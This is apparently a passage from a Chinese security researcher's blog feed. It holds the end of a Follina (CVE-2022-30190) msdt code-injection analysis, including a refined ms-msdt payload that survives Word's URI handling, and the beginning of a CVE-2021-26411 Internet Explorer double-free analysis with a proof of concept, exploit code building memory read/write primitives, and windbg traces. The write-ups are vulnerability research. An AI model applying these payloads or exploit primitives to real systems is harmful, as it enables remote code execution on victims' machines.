000000e4`8ad4df70  00000000`00000004
000000e4`8ad4df78  000000e4`8ad4d6f0
000000e4`8ad4df80  00000000`00000000
000000e4`8ad4df88  00000000`0006001a
000000e4`8ad4df90  00000000`00000001
000000e4`8ad4df98  00000000`00000001
000000e4`8ad4dfa0  00000000`00000000
0:027&gt; du 00000210`54bae7b0				//创建的进程名
00000210`54bae7b0  "\??\C:\Windows\system32\msdt.exe"
00000210`54bae7f0  ""
0:027&gt; k								//创建msdt.exe的线程调用栈
 # Child-SP          RetAddr           Call Site
00 000000e4`8ad4d358 00007ffa`d8128e73 ntdll!NtCreateUserProcess
01 000000e4`8ad4d360 00007ffa`d81271a6 KERNELBASE!CreateProcessInternalW+0xfe3
02 000000e4`8ad4e930 00007ffa`d89dcbb4 KERNELBASE!CreateProcessW+0x66
03 000000e4`8ad4e9a0 00007ffa`d5f1152d KERNEL32!CreateProcessWStub+0x54
04 000000e4`8ad4ea00 00007ffa`d5ea6722 windows_storage!CInvokeCreateProcessVerb::CallCreateProcess+0x2cd
05 000000e4`8ad4ecb0 00007ffa`d5f0a75c windows_storage!CInvokeCreateProcessVerb::_PrepareAndCallCreateProcess+0x2d6
06 000000e4`8ad4ed30 00007ffa`d5f0a583 windows_storage!CInvokeCreateProcessVerb::_TryCreateProcess+0x3c
07 000000e4`8ad4ed60 00007ffa`d5f0a46d windows_storage!CInvokeCreateProcessVerb::Launch+0xef
08 000000e4`8ad4ee00 00007ffa`d5f49dc4 windows_storage!CInvokeCreateProcessVerb::Execute+0x5d
09 000000e4`8ad4ee40 00007ffa`d5e31d87 windows_storage!CBindAndInvokeStaticVerb::InitAndCallExecute+0x214
0a 000000e4`8ad4eec0 00007ffa`d5ea5787 windows_storage!CBindAndInvokeStaticVerb::TryCreateProcessDdeHandler+0x63
0b 000000e4`8ad4ef40 00007ffa`d5ef586d windows_storage!CBindAndInvokeStaticVerb::Execute+0x1e7
0c 000000e4`8ad4f260 00007ffa`d5ef5785 windows_storage!RegDataDrivenCommand::_TryInvokeAssociation+0xad
0d 000000e4`8ad4f2c0 00007ffa`d9b92b22 windows_storage!RegDataDrivenCommand::_Invoke+0x141
0e 000000e4`8ad4f330 00007ffa`d9b929da SHELL32!CRegistryVerbsContextMenu::_Execute+0xce
0f 000000e4`8ad4f3a0 00007ffa`d9b9630c SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xaa
10 000000e4`8ad4f6a0 00007ffa`d9b9618d SHELL32!HDXA_LetHandlerProcessCommandEx+0x10c
11 000000e4`8ad4f7b0 00007ffa`d9b926ab SHELL32!CDefFolderMenu::InvokeCommand+0x13d
12 000000e4`8ad4fb10 00007ffa`d9b92583 SHELL32!CShellExecute::_InvokeInProcExec+0xfb
13 000000e4`8ad4fc10 00007ffa`d9bcd671 SHELL32!CShellExecute::_InvokeCtxMenu+0x5b
14 000000e4`8ad4fc50 00007ffa`d9bac32d SHELL32!CShellExecute::_DoExecute+0x151
15 000000e4`8ad4fcc0 00007ffa`da48c3f9 SHELL32!&lt;lambda_519a2c088cd7d0cdfafe5aad47e70646&gt;::&lt;lambda_invoker_cdecl&gt;+0x2d
16 000000e4`8ad4fd30 00007ffa`d89d7034 SHCORE!_WrapperThreadProc+0xe9
17 000000e4`8ad4fe10 00007ffa`da5c2651 KERNEL32!BaseThreadInitThunk+0x14
18 000000e4`8ad4fe40 00000000`00000000 ntdll!RtlUserThreadStart+0x21
</code></pre></div></div>

<p>分析word解析URL是因为在尝试缩减payload的过程中发现了缩减后的payload能在cmd上成功执行命令，但是内嵌到docx文档中则无法执行，于是探索了一番。</p>

<h3 id="一些尝试">一些尝试</h3>

<p>原本的payload可以直接在cmd上运行，其中有些参数是不必要的，最终缩减的payload为<code class="language-plaintext highlighter-rouge">msdt /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"</code>，将payload替换到poc.html中<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../../$(calc).exe \" ";</code>。然而该payload却无法在word中执行成功，procmon抓到的参数是不完整的：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-02.png" alt="Snipaste_2022-06-08_09-53-02" /></p>

<p>重新调试word，断在ShellExecURL，发现到该函数时命令行的参数已经变成<code class="language-plaintext highlighter-rouge">ms-msdt:/id PCWDiagnostic /$(calc).exe</code>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=0000000000000000 rbx=0000000000000000 rcx=000002c0dc60fc00
rdx=000002c0cdec0000 rsi=000002c8e5144200 rdi=000002c8e5190400
rip=00007ffa9737fbf8 rsp=000000fbbf39d748 rbp=000000fbbf39d850
 r8=000002c0cde50d20  r9=0000000000000001 r10=0000000000008000
r11=000000fbbf39d5a0 r12=00007ffa97dbe358 r13=0000000000000000
r14=0000000000000000 r15=000002c0df5435d0
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!ShellExecURL:
00007ffa`9737fbf8 488bc4          mov     rax,rsp
0:000&gt; du 000002c0df5438a0 
000002c0`df5438a0  "/id PCWDiagnostic /$(calc).exe""
</code></pre></div></div>

<p>向前回溯在执行函数<code class="language-plaintext highlighter-rouge">iertutil!CreateUri</code>后，传入的参数被截断：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=00000000000000dc rbx=000000000000006e rcx=000000b3c48fbe10
rdx=0000000003002b85 rsi=000001f1917fe9a8 rdi=0000000000000000
rip=00007ffa96d34a77 rsp=000000b3c48fbdb0 rbp=000000b3c48fbeb0
 r8=0000000000000000  r9=000000b3c48fbde8 r10=0000000000000000
r11=000000000000006e r12=000000b3c48fdeb0 r13=0000000000000000
r14=000000b3c48fdec8 r15=000000000000006e
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!GetFullyExpandedUri+0x12b:
00007ffa`96d34a77 48ff1572c7f600  call    qword ptr [mshtml!_imp_CreateUri (00007ffa`97ca11f0)] ds:00007ffa`97ca11f0={iertutil!CreateUri (00007ffa`ce4ffa10)}
0:000&gt; du rcx											//传入的参数
000000b3`c48fbe10  "ms-msdt:/id PCWDiagnostic /skip "
000000b3`c48fbe50  "force /param "IT_LaunchMethod=Co"
000000b3`c48fbe90  "ntextMenu IT_BrowseForFile=/../."
000000b3`c48fbed0  "./$(calc).exe""
0:000&gt; dps r9 L1										//传出的IUri结构指针
000000b3`c48fbde8  00000000`00000000
0:000&gt; p
mshtml!GetFullyExpandedUri+0x132:
00007ffa`96d34a7e 0f1f440000      nop     dword ptr [rax+rax]
0:000&gt; du poi(poi(000000b3`c48fbde8)+68)				//执行完函数后返回的IUri结构所指的URI字符串
000001f1`8a2bc560  "/id PCWDiagnostic /$(calc).exe""
</code></pre></div></div>

<p>此时查看MSDN对于<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)">CreateUri</a>函数的说明，发现对于传入的URI会进行规范化，会删除相对路径段”./”和”../”，并酌情缩短路径，因此原本的参数会被截断。</p>

<p>但是原payload中的”./”和”../”被保留下来了，分析后得知在如果参数中有”?”符号，则后面的内容不会被截断，于是重新编写payload<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_ReBrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"";</code>能成功执行：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-33.png" alt="Snipaste_2022-06-08_09-53-33" /></p>

<h1 id="漏洞原理分析">漏洞原理分析</h1>

<h2 id="windows-troubleshooting-platformwtp简介">Windows Troubleshooting Platform（WTP）简介</h2>

<h3 id="wtp架构">WTP架构</h3>

<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/about-wtp">WTP</a>由一个 Windows 故障排除运行引擎、结果报告和调试报告、四个故障排除 cmdlet 和一个托管的 Windows PowerShell 运行环境组成，不同的Windows故障排除包会调用不同PowerShell Script，并输出对应的结果报告和调试报告。下图显示了 WTP 架构：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/architecture.png" alt="architecture" /></p>

<p>Windwos故障排除包既可以通过WTP 向导 (MSDT.exe) 运行（本次漏洞就是通过这种方式），又可以在Windows PowerShell 窗口中运行，通过Windows PowerShell 窗口运行故障排除包时msdt.exe不会启动：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-15-57.png" alt="Snipaste_2022-06-08_11-15-57" /></p>

<h3 id="故障排除包troubleshooting-pack的组件">故障排除包（Troubleshooting Pack）的组件</h3>

<p>下图显示了故障排除包中包含的组件：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/manifest.png" alt="manifest" /></p>

<p>故障排除包的设计基于三个步骤或阶段：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verification）。每个阶段都表示为一组 Windows PowerShell 脚本，对应脚本的开头分别为<strong>TS</strong>，<strong>RS</strong>和<strong>VF</strong>。本次漏洞中使用的PCWDiagnostic程序兼容性诊断包就正好有三个对应阶段的不同脚本：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_14-25-03.png" alt="Snipaste_2022-06-08_14-25-03" /></p>

<p>当用户调用PCWDiagnostic程序兼容性诊断包时，WTP 会实例化一个 Windows PowerShell 运行空间来运行脚本，由于对于参数没有正确的过滤导致在执行脚本时会将参数中的”$”解析，导致了代码注入。</p>

<h2 id="调试sdiagnhostexe">调试sdiagnhost.exe</h2>

<p>使用dnSpy调试sdiagnhost.exe，可以利用windbg的工具gflags.exe设置sdiagnhost.exe的debuger为dnSpy.exe：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-44-25.png" alt="Snipaste_2022-06-08_16-44-25" /></p>

<p>执行在命令行执行payload后，sdiagnhost.exe创建后会被dnSpy调试，此时下断在<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.ManagedHost.RunScript() </code>方法，随后启动调试会断在RunScript方法内：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-52-56.png" alt="Snipaste_2022-06-08_16-52-56" /></p>

<p>可以看到待执行的PowerShell指令text中的内容就是scriptPath，随后到达第二个断点。此时text的内容依然是scriptPath，将要执行脚本<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code></p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-59-16.png" alt="Snipaste_2022-06-08_16-59-16" /></p>

<p><code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>脚本获取msdt参数中IT_BrowseForFile部分的内容并调用<code class="language-plaintext highlighter-rouge">Test-Selection</code>方法检查参数是否符合要求：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_18-53-51.png" alt="Snipaste_2022-06-08_18-53-51" /></p>

<p><code class="language-plaintext highlighter-rouge">Test-Selection</code>首先检查了IT_BrowseForFile传入的路径是否存在，接着检查路径后缀名是否为.exe或.msi，符合这两个条件表示路径合法</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-00-08.png" alt="Snipaste_2022-06-08_19-00-08" /></p>

<p>尽管/../../已经超出了C:/的根路径，但是<code class="language-plaintext highlighter-rouge">test-path</code>方法返回的结果仍然为True，因此路径被判定合法：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-05-10.png" alt="Snipaste_2022-06-08_19-05-10" /></p>

<p>随后通过<code class="language-plaintext highlighter-rouge">$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")</code>来过滤传入的路径，测试了appname的过滤效果，发现执行了过滤语句后$(calc)仍然存在</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-34-34.png" alt="Snipaste_2022-06-08_19-34-34" /></p>

<p>最终调用Update-DiagRootCause方法，且传入TARGETPATH和APPNAME：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-33-46.png" alt="Snipaste_2022-06-08_19-33-46" /></p>

<p>在dnSpy下断于<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootCause.ProcessRecord()</code>方法，点击运行后成功断下：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-52-44.png" alt="Snipaste_2022-06-08_19-52-44" /></p>

<p>继续向下调试，调用了<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>，且将APPNAME和TARGETPATH作为参数传入：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-55-45.png" alt="Snipaste_2022-06-08_19-55-45" /></p>

<p>继续运行，发现停在了<code class="language-plaintext highlighter-rouge">RunScript</code>方法，且参数正是APPNAME和TARGETPATH，说明通过调用<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>方法执行了脚本<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>，并且将参数APPNAME和TARGETPATH传入到脚本中：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-57-35.png" alt="Snipaste_2022-06-08_19-57-35" /></p>

<p>脚本接收两个参数，并赋给变量$targetPath和$appName，检查$targetPath是否为可执行文件：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-10-50.png" alt="Snipaste_2022-06-08_20-10-50" /></p>

<p>随后分别将$targetPath和$appName当作命令行参数赋给$getDiagCmd，此时命令行中会有注入的代码<code class="language-plaintext highlighter-rouge">$(calc)</code>：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-42-34.png" alt="Snipaste_2022-06-08_20-42-34" /></p>

<p>最终执行命令行，触发代码注入：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-43-30.png" alt="Snipaste_2022-06-08_20-43-30" /></p>

<p>由于在命令行中既有$targetPath，又有$appName，猜想在执行命令时应该会执行两次calc：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-07-25.png" alt="Snipaste_2022-06-09_11-07-25" /></p>

<p>查看procmon的日志，确实发现sdiagnhost.exe创建了calc.exe两次，验证了猜想：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-09-56.png" alt="Snipaste_2022-06-09_11-09-56" /></p>

<h1 id="总结">总结</h1>

<p>样本利用Office远程模板访问远程html，并利用<code class="language-plaintext highlighter-rouge">mshtml!ShellExecURL</code>函数解析了URI，调用了msdt.exe。msdt调用PCWDiagnostic程序兼容性诊断包，构造了特殊的IT_BrowseForFile参数绕过了<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>对于路径是否存在和后缀是否为可执行的校验，将路径作为参数传入并执行了脚本<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>，该脚本检测路径后缀为.exe后便直接调用<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>执行了命令行，由于命令行中嵌入了表达式<code class="language-plaintext highlighter-rouge">$(calc)</code>，造成了代码注入触发漏洞。</p>

<p>漏洞本身并不复杂，利用也很简单，但是嵌入rtf格式文件配合预览窗格能构成一个Zero-click漏洞，产生的危害还是很大的。分析漏洞的过程中也学习了很多dotnet程序的调试技巧和PowerShell命令行的执行流程，感谢各位师傅精彩的分析文章。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] CVE-2022-30190 MSDT 代码注入漏洞分析：<em>https://paper.seebug.org/1913/</em></p>

<p>[2] Follina Microsoft Office RCE with MS-MSDT Protocol：<em>https://y4er.com/post/follina-microsoft-office-rce-with-ms-msdt-protocol/</em></p>

<p>[3] Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit：<em>https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/</em></p>

<p>[4] Windows Troubleshooting Platform：<em>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/windows-troubleshooting-toolkit-portal</em></p>

<p>[5] CreateUri function：<em>https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)</em></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 在分析漏洞的过程中，陆陆续续看到许多师傅的分析文章，于是参考之后结合自己的分析总结了一下。]]></summary></entry><entry><title type="html">CVE-2021-26411漏洞分析</title><link href="http://localhost:4000/2022-02-18/CVE-2021-26411" rel="alternate" type="text/html" title="CVE-2021-26411漏洞分析" /><published>2022-02-18T00:00:00+08:00</published><updated>2022-02-18T00:00:00+08:00</updated><id>http://localhost:4000/2022-02-18/CVE-2021-26411</id><content type="html" xml:base="http://localhost:4000/2022-02-18/CVE-2021-26411"><![CDATA[<h1 id="漏洞信息">漏洞信息</h1>

<p>CVE：CVE-2021-26411</p>

<p>IE版本：IE 9-11</p>

<p>漏洞类型：Double free</p>

<p>漏洞模块：MSHTML.dll<!--more--></p>

<h1 id="漏洞成因">漏洞成因</h1>

<p>POC：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">elem</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">xxx</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">var</span> <span class="nx">attr1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">yyy</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">var</span> <span class="nx">attr2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">zzz</span><span class="dl">'</span><span class="p">);</span> 

<span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">valueOf</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">elem</span><span class="p">.</span><span class="nx">clearAttributes</span><span class="p">();</span>
	<span class="k">return</span> <span class="mh">0x1337</span><span class="p">;</span>
<span class="p">};</span>

<span class="nx">attr1</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
<span class="nx">attr2</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">attr1</span><span class="p">);</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">attr2</span><span class="p">);</span>
<span class="nx">elem</span><span class="p">.</span><span class="nx">removeAttributeNode</span><span class="p">(</span><span class="nx">attr1</span><span class="p">);</span> 
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>在windbg中调试发现崩溃于CAttrValue::GetDISPID中，栈回溯发现漏洞发生于ie9_removeAttributeNodeInternal函数中，于是重新在此下断：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_9-44-45.png" alt="" /></p>

<p>查看IDA反汇编代码，发现传入6个参数，而this指针是通过ECX寄存器传递的：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-7_17-11-9.png" alt="" /></p>

<p>因此下断在此直接查看ecx的CElement结构，CElement+0x10处为CAttrArray所在地址，CAttrArray内存储了5个CAttrValue结构，该结构指向的正是elem、attr1 和attr2：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-36-25.png" alt="" /></p>

<p>接着通过调用两次CBase::FindAAIndexNS函数获取了attr1和attr1.ValueOf在CAttrArray中的序号：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-56-15.png" alt="" /></p>

<p>将获取到的CAttr[1]的序号和vtType传入GetObjectAt函数获取CAttr[1]：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-9-52.png" alt="" /></p>

<p>接着调用GetIntoBSTRAt将CAttr[1].ValueOf转化为BSTR：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-12-14.png" alt="" /></p>

<p>执行完后查看CAttrArray发现elem中全部被attr2覆盖，说明在GetIntoBSTRAt函数内执行了attr1的回调函数，调用了clearAttributes将elem内的Attr对象全部释放：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_12-1-37.png" alt="" /></p>

<p>跟进调试发现GetIntoBSTRAt内调用了JavascriptDispatch::InvokeOnSelf，最终调用CElement::clearAttributes把attr1和attr2清除：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-17-52.png" alt="" /></p>

<p>执行完回调函数后会接着执行CAttrArray::Destroy来释放attr1，但是此时CAttrArray数组中被attr2覆盖，执行完毕后attr2从内存中释放：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-20-43.png" alt="" /></p>

<p>当执行到CBase::FindAAIndexNS时，Attr2已经被释放，获取Index时出错返回-1：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-23-31.png" alt="" /></p>

<p>因此在执行下一个CAttrArray::Destroy时触发Double Free，会将-1当作Index释放CAttr[-1]的对象，获取了一个非法的对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-36-29.png" alt="" /></p>

<p>因此，要想构造读写原语需要占用被释放后的attr2的内存空间，同时需要向elem中添加Attribute避免CBase::FindAAIndexNS获取到非法的下标。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="构造读写原语">构造读写原语</h2>

<p>构造读写原语部分EXP如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function pad0(str) {
    return ('0000' + str).slice(-4)
}

function alloc1() {
    var view = new DataView(abf)
    var str = ''
    for (var i = 4; i &lt; abf.byteLength - 2; i += 2)
        str += '%u' + pad0(view.getUint16(i, true).toString(16))
    var result = document.createAttribute('alloc')
    result.nodeValue = unescape(str)
    return result
}

function alloc2() {
    var dic1 = new ActiveXObject('Scripting.Dictionary')
    var dic2 = new ActiveXObject('Scripting.Dictionary')
    dic2.add(0, 1)
    dic1.add(0, dic2.items())
    dic1.add(1, fake)
    dic1.add(2, arr)
    for (i = 3; i &lt; 0x20010 / 0x10; ++i)
        dic1.add(i, 0x12341234)
    return dic1.items()
}

var god
var arr = [{}]
var fake = new ArrayBuffer(0x100)	//伪造的write-what-where读写原语
var abf = new ArrayBuffer(0x20010)	
var alloc = alloc2()				//替换ArrayBuffer的Scripting.Dictionary对象结构
var hd0 = document.createAttribute('handle')
var hd1 = document.createAttribute('handle')
var hd2
var ele = document.createElement('element')		//element对象，内有attribute回调函数和attr字符串数组
var att = document.createAttribute('attribute')
att.nodeValue = {
    valueOf: function() {
        hd1.nodeValue = (new alloc1()).nodeValue
        ele.clearAttributes()
        hd2 = hd1.cloneNode()					//执行完该语句，attr字符串已经被替换为ArrayBuffer abf
        ele.setAttribute('attribute', 1337)		//执行该语句是为了让CBase::FindAAIndexNS获取到正确的下标，导致被替换后的attr再次被释放
    }
}
ele.setAttributeNode(att)
ele.setAttribute('attr', '0'.repeat((0x20010 - 6) / 2))
ele.removeAttributeNode(att)	//执行该语句，首先会执行attribute回调函数，接着执行removeAttributeNode
hd0.nodeValue = alloc			//随后将被释放的attr替换为dic1.items
</code></pre></div></div>

<p>下断在jscript9!Js::JavascriptArrayBuffer::Create，执行完毕后查看ArrayBuffer：fake和abf的结构，获得fake和abf的内存布局：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:020&gt; bp jscript9!Js::JavascriptArrayBuffer::Create
breakpoint 0 redefined
0:020&gt; g
Breakpoint 0 hit
eax=00000100 ebx=095b4bc0 ecx=00000100 edx=08dcc8c0 esi=05d46568 edi=05d46568
eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
jscript9!Js::JavascriptArrayBuffer::Create:	 	//var fake = new ArrayBuffer(0x100)	
737893d0 8bff            mov     edi,edi
0:009&gt; gu
eax=0963fed0 ebx=095b4bc0 ecx=00000000 edx=00000078 esi=05d46568 edi=05d46568
eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
jscript9!Js::ArrayBuffer::NewInstance+0xb3:
739b7f03 5f              pop     edi
0:009&gt; dpp eax L9			//fake的ArrayBuffer结构
0963fed0  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
0963fed4  08dcc8c0 00000020
0963fed8  00000000
0963fedc  00000000
0963fee0  00000000
0963fee4  00000000
0963fee8  00000000
0963feec  05d4d338 00000000	//+0x1c为Buffer所在地址
0963fef0  00000100			//+0x20为BufferLenth
0:009&gt; g
Breakpoint 0 hit
eax=00020010 ebx=095b4bc0 ecx=00020010 edx=08dcc8c0 esi=05d46568 edi=05d46568
eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
jscript9!Js::JavascriptArrayBuffer::Create:	 //var abf = new ArrayBuffer(0x20010)
737893d0 8bff            mov     edi,edi
0:009&gt; gu
eax=0963ff00 ebx=095b4bc0 ecx=00000000 edx=00000008 esi=05d46568 edi=05d46568
eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
jscript9!Js::ArrayBuffer::NewInstance+0xb3:
739b7f03 5f              pop     edi
0:009&gt; dpp eax L9	 		//abf的ArrayBuffer结构
0963ff00  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
0963ff04  08dcc8c0 00000020
0963ff08  00000000
0963ff0c  00000000
0963ff10  00000000
0963ff14  00000000
0963ff18  00000000
0963ff1c  05d61fe8 00000000 //+0x1c为Buffer所在地址
0963ff20  00020010		 	//+0x20为BufferLenth
</code></pre></div></div>

<p>此时在Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b处下断，该函数为对象函数调用处，可以看到hd0，hd1和ele在内存中的布局：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; bp Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b
0:009&gt; g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd0 = document.createAttribute('handle')
0:009&gt; p
eax=0a2f9cf0 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
0:009&gt; dd poi(eax+18) L10	//hd0
05387200  715961ec 00000001 00000001 00000008
05387210  00000000 00000000 0a2f9cf0 00000000
05387220  ffffffff 093b32c4 00000008 00000000
05387230  00000000 00000000 05382370 00000000
0:009&gt; du 093b32c4 
093b32c4  "handle"
0:009&gt; g
